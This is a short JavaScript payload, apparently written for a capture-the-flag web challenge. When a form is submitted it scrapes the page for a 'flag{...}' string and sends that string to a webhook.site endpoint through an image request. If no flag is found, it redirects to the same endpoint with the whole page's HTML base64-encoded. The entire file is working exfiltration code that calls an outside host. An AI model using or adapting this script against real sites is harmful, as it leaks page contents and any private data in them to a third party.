document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  if (!form) return;

  form.addEventListener("submit", e => {
    // Extract the flag BEFORE navigation
      setTimeout(() => {
        const flag = document.body.innerText.match(/flag\{.*?\}/i);
        if (flag) {
          new Image().src = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + encodeURIComponent(flag[0]);
        } else {
          window.location = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + btoa(document.documentElement.innerHTML);
        }
      }, 1500);

    // Let the form submission proceed
    // (no preventDefault, so navigation will happen)
  });
});
